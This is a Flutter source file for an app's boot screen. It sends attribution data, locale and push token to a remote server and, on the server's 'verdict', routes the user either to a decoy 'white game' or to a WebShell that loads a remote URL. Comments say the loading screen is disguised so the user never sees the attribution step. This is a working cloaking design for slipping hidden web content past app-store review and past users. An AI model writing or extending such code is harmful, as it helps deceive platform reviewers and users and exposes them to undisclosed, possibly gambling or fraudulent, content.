import 'dart:async';
import 'dart:io';

import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import 'beacon.dart';
import 'keeper.dart';
import 'models.dart';
import 'native_tap.dart';
import 'offering_prompt.dart';
import 'offline_stage.dart';
import 'omen_signal.dart';
import 'payload_forge.dart';
import 'push_channel.dart';
import 'push_consent.dart';
import 'web_shell.dart';

/// Boot / routing screen. Owns the launch decision and shows a programm-
/// atic loading indicator while it runs.
class BootStage extends StatefulWidget {
  const BootStage({
    super.key,
    required this.keeper,
    required this.signal,
    required this.forge,
    required this.channel,
    required this.consent,
    required this.goGame,
  });

  final OracleKeeper keeper;
  final OmenSignal signal;
  final PayloadForge forge;
  final PushChannel channel;
  final PushConsent consent;

  /// Called once the boot decides the user should go to the white game.
  final void Function() goGame;

  @override
  State<BootStage> createState() => _BootStageState();
}

class _BootStageState extends State<BootStage> {
  bool _navigated = false;

  @override
  void initState() {
    super.initState();
    SystemChrome.setPreferredOrientations(const [
      DeviceOrientation.portraitUp, DeviceOrientation.portraitDown,
      DeviceOrientation.landscapeLeft, DeviceOrientation.landscapeRight,
    ]);
    _boot();
  }

  @override
  void dispose() {
    widget.channel.onTokenRotated = null;
    super.dispose();
  }

  // Progress is intentionally not surfaced — the visual is the same loading
  // artwork as the game's LoadingScreen so the transition is seamless.
  void _tick(double _) {}

  Future<void> _boot() async {
    widget.channel.onTokenRotated = _onTokenRotated;

    final tapUrl = await NativeColdTap.pull();
    if (tapUrl != null && tapUrl.isNotEmpty) {
      await widget.keeper.commitLane(LaunchLane.content);
      await widget.keeper.takeOneShot();
      unawaited(_dispatchInBackground());
      SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
      WidgetsBinding.instance.addPostFrameCallback((_) {
        if (!mounted) return;
        _routeToShell(tapUrl, coldStartTap: true);
      });
      return;
    }

    _tick(0.05);
    final lane = widget.keeper.currentLane();
    if (kDebugMode) debugPrint('[oracle] boot: starting lane=$lane');

    switch (lane) {
      case LaunchLane.content:
        _tick(0.4);
        final pushFuture = widget.channel.arm().catchError((_) {});
        await _handleContentLane(pushFuture: pushFuture);
        break;
      case LaunchLane.game:
        _tick(0.4);
        unawaited(widget.channel.arm().catchError((_) {}));
        final recovered = await _tryPromote();
        if (recovered) return;
        _tick(1.0);
        await Future.delayed(const Duration(milliseconds: 500));
        _routeToGame();
        break;
      case LaunchLane.cold:
        await widget.channel.arm().catchError((_) {});
        await _handleColdLane();
        break;
    }
  }

  Future<void> _dispatchInBackground() async {
    try {
      await Future.wait([
        widget.channel.arm().catchError((_) {}),
        widget.signal.spinUp().catchError((_) {}),
      ]);
      await Future.wait([
        widget.signal.awaitConversion(timeout: const Duration(seconds: 6)),
        widget.signal.awaitDeepLink(),
      ]);
      final body = await widget.forge.compose(
        locale: Platform.localeName.replaceAll('-', '_'),
        pushToken: widget.channel.token,
      );
      await widget.forge.dispatch(body);
    } catch (_) {}
  }

  void _onTokenRotated(String token) async {
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.forge.compose(
      locale: locale, pushToken: token,
    );
    widget.forge.dispatch(body);
  }

  Future<void> _handleColdLane() async {
    _tick(0.15);
    final online = await skyBeacon.reachable();
    if (!online) { if (mounted) _routeToOffline(); return; }

    _tick(0.35);
    await widget.signal.spinUp();
    await Future.wait([
      widget.signal.awaitConversion(),
      widget.signal.awaitDeepLink(),
    ]);
    _tick(0.65);
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.forge.compose(
      locale: locale, pushToken: widget.channel.token,
    );
    final verdict = await widget.forge.dispatch(body);

    if (verdict.approved && verdict.destination != null) {
      await widget.keeper.commitLane(LaunchLane.content);
      _tick(1.0);
      await Future.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _routeToShell(verdict.destination!);
    } else {
      await widget.keeper.commitLane(LaunchLane.game);
      _tick(1.0);
      await Future.delayed(const Duration(milliseconds: 400));
      if (!mounted) return;
      _routeToGame();
    }
  }

  Future<void> _handleContentLane({Future<void>? pushFuture}) async {
    final netFuture = skyBeacon.reachable();
    if (pushFuture != null) await Future.wait([netFuture, pushFuture]);
    final online = await netFuture;

    if (!online) {
      _tick(1.0);
      await Future.delayed(const Duration(milliseconds: 400));
      if (mounted) _routeToOffline();
      return;
    }

    final oneShot = await widget.keeper.takeOneShot();
    if (oneShot != null) {
      _tick(1.0);
      await Future.delayed(const Duration(milliseconds: 400));
      if (mounted) _routeToShell(oneShot);
      return;
    }

    final signalFuture = widget.signal.spinUp();
    final savedUrl = await widget.keeper.loadSavedUrl();
    await signalFuture;
    await Future.wait([
      widget.signal.awaitConversion(timeout: const Duration(seconds: 5)),
      widget.signal.awaitDeepLink(),
    ]);
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.forge.compose(
      locale: locale, pushToken: widget.channel.token,
    );
    final verdict = await widget.forge.dispatch(body);

    _tick(1.0);
    await Future.delayed(const Duration(milliseconds: 400));
    if (!mounted) return;

    if (verdict.approved && verdict.destination != null) {
      _routeToShell(verdict.destination!);
    } else if (savedUrl != null) {
      _routeToShell(savedUrl);
    } else {
      _routeToOffline();
    }
  }

  Future<bool> _tryPromote() async {
    final online = await skyBeacon.reachable();
    if (!online) return false;
    await widget.signal.spinUp();
    await Future.wait([
      widget.signal.awaitConversion(timeout: const Duration(seconds: 8)),
      widget.signal.awaitDeepLink(),
    ]);
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.forge.compose(
      locale: locale, pushToken: widget.channel.token,
    );
    final verdict = await widget.forge.dispatch(body);
    if (!(verdict.approved && verdict.destination != null)) return false;
    await widget.keeper.commitLane(LaunchLane.content);
    _tick(1.0);
    await Future.delayed(const Duration(milliseconds: 400));
    if (!mounted) return true;
    _routeToShell(verdict.destination!);
    return true;
  }

  void _routeToShell(String url, {bool coldStartTap = false}) {
    if (_navigated) return;
    _navigated = true;
    if (kDebugMode) debugPrint('[oracle] route -> WebShell($url)');
    if (widget.keeper.needsConsentPrompt()) {
      widget.consent.shouldOffer().then((canAsk) {
        if (!mounted) return;
        if (canAsk) {
          Navigator.of(context).pushReplacement(MaterialPageRoute(
            builder: (_) => OfferingPrompt(
              keeper: widget.keeper,
              channel: widget.channel,
              consent: widget.consent,
              destination: url,
              coldStartTap: coldStartTap,
              onTokenReady: (token) async {
                final locale = Platform.localeName.replaceAll('-', '_');
                final body = await widget.forge.compose(
                  locale: locale, pushToken: token,
                );
                widget.forge.dispatch(body);
              },
            ),
          ));
        } else {
          _routeDirect(url, coldStartTap: coldStartTap);
        }
      });
    } else {
      _routeDirect(url, coldStartTap: coldStartTap);
    }
  }

  void _routeDirect(String url, {bool coldStartTap = false}) {
    if (!mounted) return;
    Navigator.of(context).pushReplacement(MaterialPageRoute(
      builder: (_) => WebShell(
        destination: url,
        keeper: widget.keeper,
        channel: widget.channel,
        coldStartTap: coldStartTap,
      ),
    ));
  }

  void _routeToGame() {
    if (_navigated) return;
    _navigated = true;
    if (kDebugMode) debugPrint('[oracle] route -> Game');
    widget.goGame();
  }

  void _routeToOffline() {
    if (_navigated) return;
    _navigated = true;
    if (kDebugMode) debugPrint('[oracle] route -> Offline');
    Navigator.of(context).pushReplacement(MaterialPageRoute(
      builder: (_) => OfflineStage(
        retryBuilder: (_) => BootStage(
          keeper: widget.keeper,
          signal: widget.signal,
          forge: widget.forge,
          channel: widget.channel,
          consent: widget.consent,
          goGame: widget.goGame,
        ),
      ),
    ));
  }

  @override
  Widget build(BuildContext context) {
    // The boot stage reuses the game's LoadingScreen artwork so the user
    // never sees a distinct "attribution loader" — the visual is seamless
    // from cold-start through to the white game.
    return Scaffold(
      backgroundColor: const Color(0xFF0A0E1A),
      body: OrientationBuilder(
        builder: (context, orientation) {
          final asset = orientation == Orientation.portrait
              ? 'assets/Vertical_LoadingScreen.webp'
              : 'assets/Horizontal_LoadingScreen.webp';
          return Image.asset(
            asset,
            fit: BoxFit.cover,
            width: double.infinity,
            height: double.infinity,
            errorBuilder: (_, _, _) =>
                const ColoredBox(color: Color(0xFF0A0E1A)),
          );
        },
      ),
    );
  }
}
